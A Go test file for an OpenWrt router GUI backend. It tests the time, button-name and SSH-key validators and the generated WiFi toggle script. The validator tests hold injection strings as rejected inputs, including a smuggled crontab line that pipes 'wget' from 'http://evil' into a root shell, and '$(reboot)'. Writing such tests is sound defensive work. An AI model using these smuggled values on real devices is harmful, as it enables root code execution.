package services

import (
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/openwrt-travel-gui/backend/internal/models"
)

func TestValidateHHMM(t *testing.T) {
	cases := []struct {
		in      string
		wantErr bool
	}{
		{"00:00", false},
		{"07:30", false},
		{"23:59", false},
		{"24:00", true},
		{"7:30", true},
		{"07:60", true},
		{"0730", true},
		{"", true},
		// crontab injection attempts (P0: root RCE via crontab)
		{"00:00\n* * * * root /bin/sh -c 'wget -qO- http://evil/x|sh' #", true},
		{"00:00\r\n* * * * root reboot", true},
		{"00:00 * * * *", true},
		{"00:00; reboot", true},
		{"$(reboot)", true},
	}
	for _, tc := range cases {
		err := ValidateHHMM(tc.in)
		if (err != nil) != tc.wantErr {
			t.Errorf("ValidateHHMM(%q) err=%v, wantErr=%v", tc.in, err, tc.wantErr)
		}
	}
}

func TestValidateButtonName(t *testing.T) {
	discovered := []string{"POWER", "volume_up", "reset-factory"}
	cases := []struct {
		name    string
		dis     []string
		wantErr bool
	}{
		{"POWER", discovered, false},
		{"volume_up", discovered, false},
		{"reset-factory", discovered, false},
		{"", discovered, true},
		{"NOT_A_BUTTON", discovered, true},
		{"POWER; reboot", discovered, true},
		{"POWER)\n  reboot)\n    reboot\n  x)", discovered, true},
		{"POWER\n", discovered, true},
		{"POWER", nil, false}, // no devicetree labels: charset check only
		{"POWER; reboot", nil, true},
	}
	for _, tc := range cases {
		err := ValidateButtonName(tc.name, tc.dis)
		if (err != nil) != tc.wantErr {
			t.Errorf("ValidateButtonName(%q, %v) err=%v, wantErr=%v", tc.name, tc.dis, err, tc.wantErr)
		}
	}
}

func TestAddSSHKeyRejectsMultilineAndGarbage(t *testing.T) {
	s := NewSystemService(nil, nil, nil)
	if err := s.AddSSHKey("ssh-ed25519 AAAA user@host\nssh-rsa AAAA evil@host"); err == nil {
		t.Error("expected multi-line key to be rejected")
	}
	if err := s.AddSSHKey("not a key"); err == nil {
		t.Error("expected malformed key to be rejected")
	}
}

func TestBuildButtonHotplugScriptHasNoWifiCommands(t *testing.T) {
	script := buildButtonHotplugScript([]models.HardwareButton{
		{Name: "POWER", Action: models.ButtonActionWifiToggle},
		{Name: "volume_up", Action: models.ButtonActionVPNToggle},
	})
	for _, forbidden := range []string{"wifi up", "wifi down", "wifi reload"} {
		if strings.Contains(script, forbidden) {
			t.Errorf("hotplug script must not contain %q:\n%s", forbidden, script)
		}
	}
	if !strings.Contains(script, wirelessToggleScriptPath) {
		t.Errorf("hotplug script should delegate to the toggle helper:\n%s", script)
	}
}

func TestWirelessToggleScriptIsUCIOnly(t *testing.T) {
	// Comments may name the forbidden commands; the executed lines may not.
	code := make([]string, 0, 32)
	for _, line := range strings.Split(wirelessToggleScript, "\n") {
		if strings.HasPrefix(strings.TrimSpace(line), "#") {
			continue
		}
		code = append(code, line)
	}
	joined := strings.Join(code, "\n")
	for _, forbidden := range []string{"wifi up", "wifi down", "wifi reload"} {
		if strings.Contains(joined, forbidden) {
			t.Errorf("toggle script must not execute %q", forbidden)
		}
	}
	for _, want := range []string{"uci -q commit wireless", "uci apply", "uci confirm", "GUARD"} {
		if !strings.Contains(joined, want) {
			t.Errorf("toggle script missing %q", want)
		}
	}
}

// The generated toggle script must select every radio from `uci show wireless`.
// Stock OpenWrt names its radios (radio0, radio1) and only uses the anonymous
// `@wifi-device[N]` form when a config does not; a pattern that matches only the
// anonymous form silently toggles nothing while logging success.
//
// The pattern is exercised through `sh -c`, the same interpreter the device
// uses, rather than by calling sed directly: BSD sed (macOS) and GNU/BusyBox
// sed (the device) disagree on escaping, and a test that skips is worthless.
func TestWirelessToggleScriptSelectsNamedAndAnonymousRadios(t *testing.T) {
	uciShow := strings.Join([]string{
		"wireless.radio0=wifi-device",
		"wireless.radio0.type=wifi-device",
		"wireless.@wifi-device[0]=wifi-device",
		"wireless.@wifi-iface[0]=wifi-iface",
		"wireless.default_radio0=wifi-iface",
		"",
	}, "\n")

	// Lift the sed expression the script itself uses, so the test cannot drift
	// from the generated helper.
	start := strings.Index(wirelessToggleScript, "sed -n 's/")
	end := strings.Index(wirelessToggleScript[start:], "/p'")
	if start < 0 || end < 0 {
		t.Fatal("could not find the sed expression in the toggle script")
	}
	expr := wirelessToggleScript[start+len("sed -n '") : start+end]

	cmd := exec.Command("sh", "-c", "sed -n '"+expr+"/p'")
	cmd.Stdin = strings.NewReader(uciShow)
	out, err := cmd.Output()
	if err != nil {
		t.Fatalf("running the toggle script's sed expression: %v", err)
	}

	selected := strings.Fields(string(out))
	for _, want := range []string{"radio0", "@wifi-device[0]"} {
		if !slices.Contains(selected, want) {
			t.Errorf("toggle script does not select radio %q from stock `uci show` output; selected %v",
				want, selected)
		}
	}
	for _, s := range selected {
		if strings.Contains(s, "wifi-iface") {
			t.Errorf("toggle script must not select the wifi-iface section %q", s)
		}
	}
}

// The generated toggle helper is what actually runs on the device, from cron
// and from the button hotplug script, with no way to report an error to anyone
// but syslog. The only test that existed for it matched substrings, so a helper
// that could never apply still passed.
//
// This runs the real script under /bin/sh with a stub `ubus` on PATH and
// asserts the actual call sequence: rpcd's uci apply/confirm are session
// scoped, so the script must log in, stage the config into the session dir, and
// pass "ubus_rpc_session" on BOTH calls. Passing a config name or a bare
// "session" key makes rpcd return INVALID_ARGUMENT, which turned every
// scheduled and button-driven WiFi toggle into a silent no-op.
func TestWirelessToggleScriptApplyCallSequence(t *testing.T) {
	if _, err := exec.LookPath("sh"); err != nil {
		t.Skip("no /bin/sh available")
	}

	_, calls, guardDir := runToggleScript(t, `#!/bin/sh
echo "ubus $*" >> "$CALLS"
if [ "$1" = "-S" ]; then shift; fi
case "$3" in
  login) echo '{"ubus_rpc_session":"sid-1"}' ;;
  *) echo '{}' ;;
esac
exit 0
`, "up", true)

	log, err := os.ReadFile(calls)
	if err != nil {
		t.Fatalf("read stub log: %v", err)
	}
	seq := string(log)
	for _, want := range []string{
		"call session login",               // establish a session first
		`uci apply {"ubus_rpc_session":`,   // apply must carry the session
		`uci confirm {"ubus_rpc_session":`, // confirm takes the same key
	} {
		if !strings.Contains(seq, want) {
			t.Errorf("toggle helper did not issue %q; recorded calls:\n%s", want, seq)
		}
	}
	// The session id login returned must be the one both calls carry. The login
	// call itself does not echo it back, so it appears exactly twice.
	if n := strings.Count(seq, "sid-1"); n != 2 {
		t.Errorf("expected the login session id in exactly the apply and confirm calls, saw %d:\n%s", n, seq)
	}
	// A guard is written before the first mutation and removed only after a
	// confirmed apply; the script must not leave it behind on success.
	if _, err := os.Stat(filepath.Join(guardDir, "wifi-toggle-in-progress")); !os.IsNotExist(err) {
		t.Errorf("a successful toggle must remove %s", filepath.Join(guardDir, "wifi-toggle-in-progress"))
	}
}

// A failing apply — before rpcd's rollback window is armed — must revert the
// staged wireless delta and clear the guard, so the next scheduled run is not
// permanently blocked by a guard this helper can never resolve on its own.
func TestWirelessToggleScriptRevertsAndClearsGuardOnApplyFailure(t *testing.T) {
	_, _, guardDir := runToggleScript(t, `#!/bin/sh
echo "ubus $*" >> "$CALLS"
if [ "$1" = "-S" ]; then shift; fi
case "$3" in
  login) echo '{"ubus_rpc_session":"sid-1"}' ;;
  apply) echo "apply refused" >&2; exit 1 ;;
  *) echo '{}' ;;
esac
exit 0
`, "down", false)

	if _, err := os.Stat(filepath.Join(guardDir, "wifi-toggle-in-progress")); !os.IsNotExist(err) {
		t.Error("a failed apply must clear its guard, or every later run is blocked")
	}
}

// A CONFIRM failure happens AFTER `uci apply` succeeded, so rpcd is holding the
// rollback snapshot in the session dir and its timer is already armed. The
// helper must then keep BOTH the session dir (it is where the snapshot lives)
// and the crash guard (removing it would let the next cron run start a second
// apply against rpcd's single apply slot while the first is still pending).
func TestWirelessToggleScriptKeepsGuardAndSessionAfterApplyStarted(t *testing.T) {
	binDir, _, guardDir := runToggleScript(t, `#!/bin/sh
echo "ubus $*" >> "$CALLS"
if [ "$1" = "-S" ]; then shift; fi
case "$3" in
  login) echo '{"ubus_rpc_session":"sid-1"}' ;;
  confirm) echo "confirm refused" >&2; exit 1 ;;
  *) echo '{}' ;;
esac
exit 0
`, "up", false)

	if _, err := os.Stat(filepath.Join(guardDir, "wifi-toggle-in-progress")); err != nil {
		t.Error("the guard must survive a post-apply failure: it is the only marker that the rollback is unresolved")
	}
	// The session dir is what rpcd restores from, so it must not be deleted.
	if _, err := os.Stat(filepath.Join(binDir, "run", "uci-sid-1")); err != nil {
		t.Error("the rpcd session dir must survive a post-apply failure; it holds the rollback snapshot")
	}
}

// writeToggleScriptFixture stages the REAL generated helper in a temp bin
// directory alongside a stub ubus, and returns (binDir, callsLog, guardDir,
// scriptPath) ready to be executed. The paths inside the script are rewritten
// so it never touches the test machine's /etc or /var.
func writeToggleScriptFixture(t *testing.T, ubusStub string) (binDir, calls, guardDir, scriptPath string) {
	t.Helper()

	binDir = t.TempDir()
	calls = filepath.Join(binDir, "calls.log")
	guardDir = filepath.Join(binDir, "trafo")

	if err := os.WriteFile(filepath.Join(binDir, "ubus"), []byte(ubusStub), 0o755); err != nil {
		t.Fatalf("write ubus stub: %v", err)
	}
	// binDir goes FIRST on PATH, so these stubs shadow the real binaries.
	// uci and logger only have to succeed. cp, mkdir and rm must really act,
	// because the guard-lifecycle assertions check the filesystem afterwards —
	// so each shim execs the real binary by ABSOLUTE path. A bare `rm "$@"`
	// would resolve through PATH straight back into this shim and recurse
	// forever.
	for _, name := range []string{"cp", "mkdir", "rm"} {
		real, err := exec.LookPath(name)
		if err != nil {
			t.Fatalf("locate real %s: %v", name, err)
		}
		body := "#!/bin/sh\nexec " + real + " \"$@\"\n"
		if name == "mkdir" {
			body = "#!/bin/sh\nexec " + real + " -p \"$@\"\n"
		}
		if err := os.WriteFile(filepath.Join(binDir, name), []byte(body), 0o755); err != nil {
			t.Fatalf("write %s stub: %v", name, err)
		}
	}
	for _, name := range []string{"uci", "logger"} {
		if err := os.WriteFile(filepath.Join(binDir, name), []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
			t.Fatalf("write %s stub: %v", name, err)
		}
	}

	script := strings.ReplaceAll(wirelessToggleScript, crashGuardDir, guardDir)
	script = strings.ReplaceAll(script, "RPCD_RUN_DIR=/var/run/rpcd", "RPCD_RUN_DIR="+filepath.Join(binDir, "run"))
	script = strings.ReplaceAll(script, "RPCD_UCI_DIR=/etc/config", "RPCD_UCI_DIR="+filepath.Join(binDir, "config"))
	if err := os.MkdirAll(filepath.Join(binDir, "config"), 0o755); err != nil {
		t.Fatalf("config dir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(binDir, "config", "wireless"), []byte("wireless\n"), 0o644); err != nil {
		t.Fatalf("stage wireless: %v", err)
	}

	scriptPath = filepath.Join(binDir, "toggle.sh")
	if err := os.WriteFile(scriptPath, []byte(script), 0o755); err != nil {
		t.Fatalf("write script: %v", err)
	}
	return binDir, calls, guardDir, scriptPath
}

// runToggleScript writes the fixture with the given ubus stub, runs the helper
// and reports whether it exited zero. It returns the binDir (so a caller can
// inspect the rpcd session dir) and the guardDir.
func runToggleScript(t *testing.T, ubusStub, state string, wantSuccess bool) (binDir, calls, guardDir string) {
	t.Helper()

	binDir, calls, guardDir, scriptPath := writeToggleScriptFixture(t, ubusStub)
	cmd := exec.Command("sh", scriptPath, state)
	cmd.Env = append(os.Environ(), "PATH="+binDir+":"+os.Getenv("PATH"), "CALLS="+calls)
	out, err := cmd.CombinedOutput()
	if wantSuccess && err != nil {
		t.Fatalf("toggle helper failed: %v\n%s", err, out)
	}
	if !wantSuccess && err == nil {
		t.Fatal("expected the helper to exit non-zero")
	}
	return binDir, calls, guardDir
}
